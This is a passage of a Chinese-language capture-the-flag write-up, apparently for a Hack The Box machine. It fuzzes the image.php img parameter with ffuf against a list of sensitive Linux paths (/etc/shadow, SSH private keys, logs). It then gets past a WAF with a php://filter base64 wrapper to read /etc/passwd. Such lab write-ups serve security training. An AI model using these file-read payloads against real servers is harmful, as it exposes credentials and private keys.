+/etc/httpd/conf/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/httpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/meminfo           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/htmp               [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache-ssl/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/httpsd/ssl.access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/httpsd/ssl_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php4/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/kern.log       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/lighttpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mail.info      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/exim/mainlog   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/messages       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/mtab               [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/lighttpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mail.warn      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/httpd/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/cpanel/logs/login_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/ftp-proxy      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mysqlderror.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/pureftpd.log   [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/maillog        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mysql.log      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/message        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/vsftpd.log     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/wtmp           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/ftplog         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/xferlog        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/lastlog        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/yum.log        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/spool/cron/crontabs/root [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/lib/mysql/mysql/user.MYD [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/www/log/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.bash_profile         [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.bashrc               [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/secure         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/webmin/miniserv.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mail.log       [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.mysql_history        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/logs/pure-ftpd.log     [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.profile              [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.ssh/authorized_keys  [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.atfp_history         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache2/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.nano_history         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/exim.paniclog  [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.login                [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/mysql.log          [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.ssh/id_rsa           [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.ssh/id_rsa.pub       [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.php_history          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/printcap           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mysql/mysql-slow.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.ssh/identity.pub     [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/ssh/sshd_config    [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.viminfo              [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.wm_style             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/proftpd        [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/httpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.xinitrc              [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.xsession             [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.logout               [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/www/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.ssh/id_dsa           [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.ssh/id_dsa.pub       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php5/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.bash_logout          [Status: 200, Size: 0, Words: 1, Lines: 1]
+/proc/self/net/arp      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/www/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/www/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.ssh/identity         [Status: 200, Size: 0, Words: 1, Lines: 1]
+/etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php4/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.bash_history         [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.Xdefaults            [Status: 200, Size: 0, Words: 1, Lines: 1]
+/usr/local/php/httpd.conf.ini [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.gtkrc                [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/www/log/error_log  [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+~/.Xresources           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/auth.log       [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/boot           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/chttp.log      [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mysql/mysql-bin.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/log/mysql/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/run/utmp           [Status: 200, Size: 0, Words: 1, Lines: 1]
+/var/www/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]
+:: Progress: [257/257] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
+</code></pre>
+<p>这边可以fuzz出来，但内容都是0，证明参数不对，尝试一下其他参数</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.135/image.php?img=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.135/image.php?img=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 0
+________________________________________________
+
+/etc/aliases            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/at.allow           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/hosts.deny         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/access.conf  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/conf/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/cups/cupsd.conf    [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ftpchroot          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/chrootUsers        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/groups             [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/lilo.conf          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/httpd.conf   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/shadow             [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/php.ini      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/inittab            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/hosts.allow        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/inetd.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/srm.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/motd               [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/logrotate.d/proftpd [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/logrotate.d/vsftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/apache2/apache2.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ftpaccess          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/modules.conf       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/mtab               [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php5/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/bashrc             [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/anacrontab         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php/php4/php.ini   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/passwd             [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/issue              [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/chttp.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/exports            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/network/interfaces [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/cron.deny          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/my.conf            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/fstab              [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/grub.conf          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php4/cgi/php.ini   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/pureftpd.passwd    [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/pureftpd.pdb       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/redhat-release     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ssh/ssh_config     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/snmpd.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/passwd             [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/my.cnf             [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/termcap            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php4.4/fcgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php4/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php5/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/printcap           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/cron.allow         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/apache2/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/vsftpd/vsftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/wu-ftpd/ftpaccess  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/wu-ftpd/ftphosts   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ssh/sshd_config    [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/wu-ftpd/ftpusers   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/logs/security_log      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/samba/smb.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/filesystems       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ssh/ssh_host_dsa_key [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/stat              [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/swaps             [Status: 200, Size: 25, Words: 3, Lines: 1]
+/root/anaconda-ks.cfg   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ftphosts           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/npasswd            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/lib/php/php.ini    [Status: 200, Size: 25, Words: 3, Lines: 1]
+/logs/security_debug_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php/cgi/php.ini    [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/modules           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ssh/ssh_host_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php/php.ini        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/version           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/ioports           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/hosts              [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/cpanel/logs  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/meminfo           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/cpanel/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/conf/modsec.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/cpanel/logs/license_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/cpanel/logs/login_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/log   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/mounts            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/mysql/my.cnf       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/etc/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/proftp.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/profile            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php4/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php4/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/vsftpd.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php5/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/pure-ftpd.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/cpanel/logs/stats_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/interrupts        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/lib/php.ini        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/sysconfig/network  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/vsftpd.chroot_list [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/audit_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/Zend/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/adm/log/xferlog    [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/opt/lampp/etc/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/lib/mysql/my.cnf   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php/httpd.conf.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/logs  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/syslog.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache2/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/lib/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache2/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/logs/pure-ftpd.log     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache-ssl/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/opt/xampp/etc/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php5/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/etc/pureftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/cpanel/cpanel.config [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/lsb-release        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/logrotate.d/ftp    [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/local/www/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/htmp               [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/networks           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/www/logs/httpd_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/cups/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/lib/mysql/mysql/user.MYD [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/daemon.log     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/debug          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/dpkg.log       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/exim/mainlog   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/exim.paniclog  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/apache/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/cpanel/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/at.deny            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/motd               [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/auth.log       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/httpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/kern.log       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/lighttpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/httpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/httpd/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/httpd/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/php.ini            [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/maillog        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/bootptab           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/httpsd/ssl.access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/exim_paniclog  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/ftp-proxy      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache2/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mysql.log      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/httpsd/ssl_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mysql/mysql-bin.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mysql/mysql-slow.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/pureftpd.log   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/vsftpd.log     [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/dmesg          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/self/net/arp      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/message        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/xferlog        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/messages       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mysqlderror.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/faillog        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/mysql.log          [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/spool/cron/crontabs/root [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/www/log/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/www/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/resolv.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/lighttpd.conf      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/exim_rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php5/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/run/utmp           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/wtmp           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/webmin/miniserv.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/www/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/yum.log        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/ftplog         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/www/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/www/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache2/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mail.info      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/proftpd        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/secure         [Status: 200, Size: 25, Words: 3, Lines: 1]
+/proc/cpuinfo           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/lastlog        [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/chttp.log      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/apache/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/exim/rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/lighttpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache-ssl/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/etc/ssh/ssh_host_key   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mail.warn      [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/exim_mainlog   [Status: 200, Size: 25, Words: 3, Lines: 1]
+/usr/local/php4/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/www/log/error_log  [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/boot           [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mail.log       [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/mysql/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/log/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]
+/var/apache2/config.inc [Status: 200, Size: 25, Words: 3, Lines: 1]
+:: Progress: [257/257] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:25] :: Errors: 1 ::
+</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这边是可以读取出来东西的，证明参数对了，去随便访问一个看看</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop]
+└─# curl http://10.10.11.135/image.php?img=/etc/passwd
+Hacking attempt detected!
+</code></pre>
+<p>这里似乎碰到waf了，想办法绕过一下</p>
+<p>这里找到了一篇参考文章</p>
+<blockquote>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion#wrapper-phpfilter</a></p>
+</blockquote>
+<pre><code class="bash">http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+<p>上面这一条测试后可以绕过，现在我们来构造POC</p>
+<pre><code class="bash">┌──(root💀root)-[~/Desktop]
+└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
